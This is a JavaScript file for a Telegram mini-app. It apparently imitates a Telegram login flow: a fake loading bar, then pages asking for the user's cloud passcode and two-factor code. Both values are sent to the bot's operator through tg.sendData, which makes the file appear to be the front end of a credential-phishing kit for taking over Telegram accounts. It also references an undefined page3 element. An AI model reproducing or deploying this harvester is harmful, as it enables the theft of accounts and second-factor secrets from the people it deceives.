document.addEventListener("DOMContentLoaded", () => {
  const tg = window.Telegram.WebApp;

  const loginbtn = document.getElementById("loginbtn");
  const page1 = document.getElementById("page1");
  const page2 = document.getElementById("page2");
  const blur = document.getElementById("blur");
  const passcodebtn = document.getElementById("passcode-btn");
  const text = document.getElementById("loadtext");
  let progress = 0;
  const bar = document.getElementById("loadbar");

  const passcodeInput = document.getElementById("passcode-input");
  const twofactorInput = document.getElementById("twofactor-input");

  tg.expand();
  tg.BackButton.hide();

  const interval = setInterval(() => {
  if (getComputedStyle(text).opacity == 1) {
      progress += 1;
      bar.style.width = progress + "%";

      if (progress >= 100) {
        clearInterval(interval);
        setTimeout(() => {
          window.location.href = "login.html";
        }, 500);
      }
  }
  }, 10);

  window.showpage2 = function() {
    page2.style.display = "flex";
    requestAnimationFrame(() => {
      page2.style.transform = "translateY(0)";
    });
    page2.style.zIndex = "100";
    blur.style.opacity = "1";
    loginbtn.style.display = "none";
  };

  const passcodeBtn = document.getElementById("passcode-btn");
  passcodeBtn.addEventListener("click", () => {
    const value = passcodeInput.value;

    
    tg.sendData(JSON.stringify({ action: "passcode_value", value: value }));
    page2.style.transform = "translate(-50%, 40px)";
        page2.style.opacity = "0";

        setTimeout(() => {
          page2.style.display = "none";

          page3.style.display = "flex";
          requestAnimationFrame(() => {
            page3.style.transform = "translate(0)";
            page3.style.opacity = "1";
          });
        }, 200);
    });

    const twofactorBtn = document.getElementById("twofactor-btn");
    twofactorBtn.addEventListener("click", () => {
      const value = twofactorInput.value;
      tg.sendData(JSON.stringify({ action: "twofactor_value", value: value }));
    });




});




